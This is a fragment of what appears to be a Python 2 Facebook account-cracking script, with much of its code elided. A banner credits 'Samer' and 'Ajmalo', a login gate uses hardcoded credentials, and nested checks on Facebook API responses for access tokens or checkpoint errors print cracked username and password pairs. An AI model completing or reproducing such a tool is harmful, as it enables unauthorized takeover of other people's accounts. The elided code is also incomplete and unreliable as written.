...
\033[1;90m [ NAAM TU SUNA HUGA  TOOR AJMALO]

\x1b[1;92m=============================

\x1b[1;93m Coder + Author : Samer

\x1b[1;93m HAHA  : NAM HE KAFII HA Ajmalo

\x1b[1;93m FaceBook : Noman Khan
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            print "Logged in successfully as " + username #Dev:Samer ajmalo
...
def menu():
	...
	print "\033[1;92m         [ Ajmalo { NAM HE KAFII HA } ]"
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q['error_msg']:
							...
							print '\x1b[1;95mAJamalu\x1b[1;95m[CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
